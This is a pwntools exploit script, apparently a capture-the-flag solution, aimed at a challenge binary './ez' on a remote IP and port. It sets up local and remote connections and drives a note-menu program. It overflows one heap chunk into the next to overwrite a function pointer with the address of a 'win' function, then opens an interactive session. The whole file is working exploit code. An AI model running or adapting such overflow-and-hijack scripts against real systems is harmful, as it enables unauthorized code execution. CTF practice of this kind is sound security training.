#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 128.199.157.172 --port 23170 ./ez
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ez')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '128.199.157.172'
port = int(args.PORT or 23170)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,aslr=0, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x00000000004014e0
b *0x0000000000401600
b *0x00000000004016c0
b *0x401565
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def new(size,data):
    io.sendlineafter("oice: ","1")
    io.sendlineafter("size: ",str(size))
    io.sendlineafter("content: ",str(data))

def edit(index,data):
    io.sendlineafter("oice: ","2")
    io.sendlineafter("dex: ",str(index))
    io.sendlineafter("content: ",str(data))

def print_not(index):
    io.sendlineafter("oice: ","3")
    io.sendlineafter("dex: ",str(index))

win=0x00000000004014a0
new(16,"mantap gan") # edit
new(16,"mantap gan") # 
p='a'*8*4
p+=p64(win)
edit(0,p)
print_not(1)
io.interactive()